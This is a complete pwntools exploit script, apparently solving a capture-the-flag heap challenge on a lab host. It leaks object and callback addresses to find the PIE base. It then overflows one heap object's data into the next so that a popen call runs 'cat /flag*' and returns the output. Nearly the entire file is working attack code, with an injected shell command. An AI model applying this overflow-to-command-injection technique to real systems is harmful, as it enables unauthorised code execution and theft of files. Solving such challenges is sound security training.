#!/usr/bin/env python3
from pwn import *

# Context
context.arch = "amd64"
context.log_level = "debug"

# Target
HOST = "10.2.0.5"
PORT = 10004

# Offsets (from binary analysis)
DEBUG_FUNCTION_OFFSET = 0x9D69
DEFAULT_CALLBACK_OFFSET = 0x9DAA


def alloc_a(io, size, name=b"AAAA"):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Object size", str(size).encode())
    io.sendlineafter(b"Object name", name)


def alloc_b(io, size, name=b"BBBB"):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Object size", str(size).encode())
    io.sendlineafter(b"Object name", name)


def free_a(io):
    io.sendlineafter(b"> ", b"3")


def free_b(io):
    io.sendlineafter(b"> ", b"4")


def write_a(io, data):
    io.sendlineafter(b"> ", b"5")
    io.sendafter(b":", data)


def show_a(io):
    io.sendlineafter(b"> ", b"6")
    data = io.recvuntil(b"================")
    return data


def show_b(io):
    io.sendlineafter(b"> ", b"7")
    data = io.recvuntil(b"================")
    return data


def execute_callback_b(io):
    io.sendlineafter(b"> ", b"9")


def main():
    # Connect
    io = remote(HOST, PORT)

    log.info("Step 1: Allocate A (size 0x30)")
    alloc_a(io, 0x30, b"AAAA")

    log.info("Step 2: Show A to get addresses")
    data = show_a(io)

    import re

    obj_a_match = re.search(rb"Object address:\s*(0x[0-9a-fA-F]+)", data)
    data_a_match = re.search(rb"Data address:\s*(0x[0-9a-fA-F]+)", data)
    if obj_a_match:
        object_a_addr = int(obj_a_match.group(1), 16)
        log.info(f"Object A: {hex(object_a_addr)}")
    if data_a_match:
        data_a_addr = int(data_a_match.group(1), 16)
        log.info(f"Data A: {hex(data_a_addr)}")

    log.info("Step 3: Allocate B (small size so it's placed after A's data)")
    alloc_b(io, 0x10, b"BBBB")  # Small size

    log.info("Step 4: Show B to get addresses")
    data = show_b(io)

    callback_match = re.search(rb"Callback address:\s*(0x[0-9a-fA-F]+)", data)
    obj_b_match = re.search(rb"Object address:\s*(0x[0-9a-fA-F]+)", data)
    data_b_match = re.search(rb"Data address:\s*(0x[0-9a-fA-F]+)", data)

    if callback_match:
        callback_addr = int(callback_match.group(1), 16)
        log.info(f"Callback: {hex(callback_addr)}")
        pie_base = callback_addr - DEFAULT_CALLBACK_OFFSET
        log.info(f"PIE base: {hex(pie_base)}")

    if obj_b_match:
        object_b_addr = int(obj_b_match.group(1), 16)
        log.info(f"Object B: {hex(object_b_addr)}")
    if data_b_match:
        data_b_addr = int(data_b_match.group(1), 16)
        log.info(f"Data B: {hex(data_b_addr)}")

    # Check if we can overflow from data_a to object_b
    # write_a can write: size + 0x40 = 0x30 + 0x40 = 0x70 bytes
    offset = object_b_addr - data_a_addr
    log.info(f"Offset from Data A to Object B: {hex(offset)} ({offset} bytes)")

    if 0 < offset <= 0x70:
        log.success(f"Can reach Object B with overflow!")

        log.info("Step 5: Write payload with 'cat /flag*' command")
        # execute_callback_b does popen(object_b, "r") which reads stdout
        # So we need a command that produces output

        # Pad to reach object_b, then write command + padding + non-null callback
        cmd = b"cat /flag*"  # This will be executed and output captured by popen

        payload = b"A" * offset  # padding
        payload += cmd  # command at object_b
        payload += b"\x00" * (
            8 - len(cmd) % 8 if len(cmd) % 8 else 0
        )  # null terminate and align

        # We need at least 0x20 bytes (to reach callback at offset 0x18)
        # cmd is 10 bytes, so we need 0x18 - 10 = 14 more bytes of padding
        # Then set callback to non-null
        remaining = 0x18 - len(cmd)
        if remaining > 0:
            payload += b"\x00" * remaining
        payload += p64(1)  # callback at offset 0x18 - MUST be non-null

        write_a(io, payload[:0x70] + b"\n")

        log.info("Step 6: Execute callback B")
        execute_callback_b(io)

        # Receive the output from popen
        io.recvuntil(b"Executing callback")
        output = io.recvuntil(b"\n1. Allocate", drop=True)
        log.success(f"Output: {output}")
        print(output.decode())

    else:
        log.error(f"Cannot reach Object B: offset={hex(offset)}")

    io.close()


if __name__ == "__main__":
    main()
